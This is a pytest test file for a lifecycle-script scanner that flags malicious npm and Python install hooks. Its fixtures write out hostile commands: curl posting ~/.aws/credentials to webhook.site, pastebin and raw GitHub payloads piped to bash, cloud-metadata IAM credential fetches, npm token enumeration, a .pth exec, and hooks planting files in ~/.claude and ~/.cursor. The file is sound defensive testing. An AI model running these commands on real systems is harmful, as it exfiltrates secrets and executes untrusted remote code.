"""Tests for scan_lifecycle.py - Lifecycle Script Scanner."""

import json
import scan_lifecycle as scanner


class TestNpmHooks:
    def test_detects_suspicious_postinstall(self, repo_with_lifecycle_hooks):
        findings = scanner.scan_package_json(
            str(repo_with_lifecycle_hooks / "package.json"),
            "package.json"
        )
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) > 0
        assert any("curl" in f.snippet for f in critical)

    def test_benign_hook_is_medium(self, tmp_path):
        """Hook with no suspicious commands should be MEDIUM."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "prepare": "echo 'normal build step'"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        prepare_findings = [f for f in findings if "prepare" in f.snippet]
        assert len(prepare_findings) == 1
        assert prepare_findings[0].severity == "medium"

    def test_node_setup_js_is_high(self, tmp_path):
        """postinstall: node setup.js should be HIGH (standard attack pattern)."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "node setup.js"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        postinstall = [f for f in findings if "postinstall" in f.snippet]
        assert len(postinstall) >= 1
        # After 2.5 implementation, this should be HIGH
        assert any(f.severity == "high" for f in postinstall)

    def test_python_script_relay_is_high(self, tmp_path):
        """postinstall: python install.py should be HIGH."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "python install.py"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        postinstall = [f for f in findings if "postinstall" in f.snippet]
        assert any(f.severity == "high" for f in postinstall)

    def test_sh_script_relay_is_high(self, tmp_path):
        """preinstall: sh setup.sh should be HIGH."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "preinstall": "sh setup.sh"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        preinstall = [f for f in findings if "preinstall" in f.snippet]
        assert any(f.severity == "high" for f in preinstall)

    def test_path_script_relay_is_high(self, tmp_path):
        """postinstall: node ./scripts/setup.js should be HIGH."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "node ./scripts/setup.js"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        postinstall = [f for f in findings if "postinstall" in f.snippet]
        assert any(f.severity == "high" for f in postinstall)

    def test_compound_command_stays_medium(self, tmp_path):
        """node build.js && npm test should stay MEDIUM (not exact match)."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "prepare": "node build.js && npm test"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        prepare = [f for f in findings if "prepare" in f.snippet]
        assert len(prepare) >= 1
        assert all(f.severity == "medium" for f in prepare)

    def test_no_hooks_no_findings(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {"start": "node index.js", "test": "jest"}
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        assert len(findings) == 0


class TestBindingGyp:
    def test_detects_binding_gyp(self, tmp_path):
        """binding.gyp should be flagged as HIGH (implicit native execution)."""
        gyp = tmp_path / "binding.gyp"
        gyp.write_text('{"targets":[{"target_name":"native"}]}')
        # Run the main() dispatch logic
        import forensics_core as core
        findings = []
        for fp, rp in core.walk_repo(str(tmp_path), skip_lockfiles=True):
            import os
            if os.path.basename(fp) == 'binding.gyp':
                findings.append(core.Finding(
                    scanner="lifecycle", severity="high",
                    title="binding.gyp: Implicit Native Build",
                    description="binding.gyp triggers node-gyp rebuild",
                    file=rp, line=0, snippet="binding.gyp present",
                    category="lifecycle-hook"
                ))
        assert any(f.severity == "high" and "binding.gyp" in f.title for f in findings)


class TestAntiForensics:
    def test_detects_self_deleting_script(self, tmp_path):
        js = tmp_path / "setup.js"
        js.write_text("const fs = require('fs');\nfs.unlinkSync(__filename);\n")
        findings = scanner.scan_js_anti_forensics(str(js), "setup.js")
        assert any(f.category == "anti-forensics" for f in findings)


class TestInstallScriptIOCs:
    def test_detects_vpmdhaj_payload_markers(self, tmp_path):
        js = tmp_path / "setup.mjs"
        js.write_text(
            "fetch('http://aab.sportsontheweb.net/x.php', {headers: {'X-Supply': '1'}})\n"
            "spawn('./payload.bin', [], {env: {__DAEMONIZED: '1'}})\n"
        )
        findings = scanner.scan_js_anti_forensics(str(js), "setup.mjs")
        iocs = [f for f in findings if f.category == "install-script-ioc"]
        assert len(iocs) >= 3
        assert all(f.severity == "critical" for f in iocs)

    def test_detects_cloud_metadata_access_in_install_script(self, tmp_path):
        js = tmp_path / "preinstall.js"
        js.write_text(
            "const url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';\n"
            "fetch(url).then(r => r.text())\n"
        )
        findings = scanner.scan_js_anti_forensics(str(js), "preinstall.js")
        assert any("metadata" in f.title.lower() for f in findings)

    def test_detects_npm_token_enumeration_endpoint(self, tmp_path):
        js = tmp_path / "preinstall.js"
        js.write_text("fetch('https://registry.npmjs.org/-/npm/v1/tokens')\n")
        findings = scanner.scan_js_anti_forensics(str(js), "preinstall.js")
        assert any("npm token" in f.title.lower() for f in findings)

    def test_detects_miasma_process_memory_and_marker(self, tmp_path):
        js = tmp_path / "index.js"
        js.write_text(
            "const marker = 'Miasma: The Spreading Blight';\n"
            "fs.readFileSync('/proc/self/mem');\n"
            "const params = {bypass_2fa: true};\n"
        )
        findings = scanner.scan_js_anti_forensics(str(js), "index.js")
        iocs = [f for f in findings if f.category == "install-script-ioc"]
        assert len(iocs) >= 3

    def test_index_js_ioc_only_pass_detects_miasma_marker(self, tmp_path):
        js = tmp_path / "index.js"
        js.write_text("console.log('Miasma: The Spreading Blight')\n")
        findings = scanner.scan_js_install_iocs(str(js), "index.js")
        assert any(f.category == "install-script-ioc" for f in findings)

    def test_safe_setup_script_no_ioc_finding(self, tmp_path):
        js = tmp_path / "setup.js"
        js.write_text("console.log('building native assets')\n")
        findings = scanner.scan_js_anti_forensics(str(js), "setup.js")
        assert not any(f.category == "install-script-ioc" for f in findings)


class TestSetupPy:
    def test_detects_cmdclass(self, tmp_path):
        setup = tmp_path / "setup.py"
        setup.write_text("from setuptools import setup\nsetup(cmdclass = {'install': Evil})\n")
        findings = scanner.scan_setup_py(str(setup), "setup.py")
        assert any("cmdclass" in f.title.lower() for f in findings)

    def test_detects_subprocess_in_setup(self, tmp_path):
        setup = tmp_path / "setup.py"
        setup.write_text("import subprocess\nsubprocess.run(['curl', 'http://evil.com'])\n")
        findings = scanner.scan_setup_py(str(setup), "setup.py")
        assert any(f.severity == "critical" for f in findings)


class TestPthFiles:
    def test_detects_known_malicious_pth(self, tmp_path):
        pth = tmp_path / "litellm_init.pth"
        pth.write_text("import litellm_hook\n")
        findings = scanner.scan_pth_files(str(pth), "litellm_init.pth")
        assert any(f.severity == "critical" and "known malicious" in f.title.lower() for f in findings)

    def test_detects_exec_in_pth(self, tmp_path):
        pth = tmp_path / "custom.pth"
        pth.write_text("exec(open('payload.py').read())\n")
        findings = scanner.scan_pth_files(str(pth), "custom.pth")
        assert any(f.severity == "critical" for f in findings)


class TestPasteServiceUrls:
    def test_pastebin_in_postinstall_is_critical(self, tmp_path):
        """postinstall with pastebin.com URL should trigger a CRITICAL finding."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "curl -s https://pastebin.com/raw/abc123 | bash"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        critical = [f for f in findings if f.severity == "critical"]
        assert any(
            "paste" in f.title.lower() or "pastebin" in f.snippet.lower()
            for f in critical
        ), f"Expected CRITICAL paste service finding, got: {[f.title for f in findings]}"

    def test_raw_github_in_preinstall_is_critical(self, tmp_path):
        """preinstall fetching raw.githubusercontent.com should trigger a CRITICAL finding."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "preinstall": "curl https://raw.githubusercontent.com/evil/repo/main/payload.sh | sh"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        critical = [f for f in findings if f.severity == "critical"]
        assert any(
            "paste" in f.title.lower() or "raw" in f.snippet.lower() or "github" in f.snippet.lower()
            for f in critical
        ), f"Expected CRITICAL raw GitHub finding, got: {[f.title for f in findings]}"

    def test_webhook_site_in_install_is_critical(self, tmp_path):
        """install hook referencing webhook.site should trigger a CRITICAL finding."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "install": "curl -X POST https://webhook.site/abc123 -d @~/.aws/credentials"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        critical = [f for f in findings if f.severity == "critical"]
        assert any(
            "paste" in f.title.lower() or "webhook" in f.snippet.lower()
            for f in critical
        ), f"Expected CRITICAL webhook finding, got: {[f.title for f in findings]}"

    def test_normal_hook_no_paste_finding(self, tmp_path):
        """Hook with no paste service URLs should not trigger paste findings."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "node build.js"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        paste_findings = [f for f in findings if "paste" in f.title.lower()]
        assert len(paste_findings) == 0, f"Unexpected paste findings: {[f.title for f in paste_findings]}"


class TestAgentConfigDirWrites:
    def test_claude_config_write_in_postinstall_is_critical(self, tmp_path):
        """postinstall writing to ~/.claude/ should trigger a CRITICAL finding."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "mkdir -p ~/.claude/commands && cp hook.sh ~/.claude/commands/"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        critical = [f for f in findings if f.severity == "critical"]
        assert any(
            "agent config" in f.title.lower() or ".claude" in f.snippet.lower()
            for f in critical
        ), f"Expected CRITICAL agent config write finding, got: {[f.title for f in findings]}"

    def test_cursor_config_write_is_critical(self, tmp_path):
        """postinstall writing to ~/.cursor/ should trigger a CRITICAL finding."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "cp config.json ~/.cursor/settings.json"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        critical = [f for f in findings if f.severity == "critical"]
        assert any(
            "agent config" in f.title.lower() or ".cursor" in f.snippet.lower()
            for f in critical
        ), f"Expected CRITICAL cursor config write finding, got: {[f.title for f in findings]}"

    def test_mkdir_agent_config_pattern(self, tmp_path):
        """postinstall creating dir under .claude/ should trigger a CRITICAL finding."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "mkdir ~/.claude/"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        critical = [f for f in findings if f.severity == "critical"]
        assert any(
            "agent config" in f.title.lower() or ".claude" in f.snippet.lower()
            for f in critical
        ), f"Expected CRITICAL mkdir agent config finding, got: {[f.title for f in findings]}"

    def test_no_false_positive_on_safe_hook(self, tmp_path):
        """Hook with no agent config writes should not trigger agent config findings."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "node build.js"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        agent_findings = [f for f in findings if "agent config" in f.title.lower()]
        assert len(agent_findings) == 0, f"Unexpected agent config findings: {[f.title for f in agent_findings]}"


class TestKnownSafeHooks:
    """Known-safe postinstall commands should be LOW severity."""

    def test_husky_install_is_low(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "t", "scripts": {"postinstall": "husky install"}}))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        hook_findings = [f for f in findings if "postinstall" in f.snippet]
        assert all(f.severity == "low" for f in hook_findings), f"Got: {[(f.title, f.severity) for f in hook_findings]}"

    def test_patch_package_is_low(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "t", "scripts": {"prepare": "patch-package"}}))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        hook_findings = [f for f in findings if "prepare" in f.snippet]
        assert all(f.severity == "low" for f in hook_findings)

    def test_prisma_generate_is_low(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "t", "scripts": {"postinstall": "prisma generate"}}))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        hook_findings = [f for f in findings if "postinstall" in f.snippet]
        assert all(f.severity == "low" for f in hook_findings)

    def test_tsc_is_low(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "t", "scripts": {"prepare": "tsc"}}))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        hook_findings = [f for f in findings if "prepare" in f.snippet]
        assert all(f.severity == "low" for f in hook_findings)

    def test_unknown_stays_medium(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "t", "scripts": {"postinstall": "some-random-cmd"}}))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        hook_findings = [f for f in findings if "postinstall" in f.snippet]
        assert any(f.severity == "medium" for f in hook_findings)

    def test_husky_with_pipe_not_whitelisted(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "t", "scripts": {"postinstall": "husky install && curl evil.com"}}))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        hook_findings = [f for f in findings if "postinstall" in f.snippet]
        assert any(f.severity == "critical" for f in hook_findings)
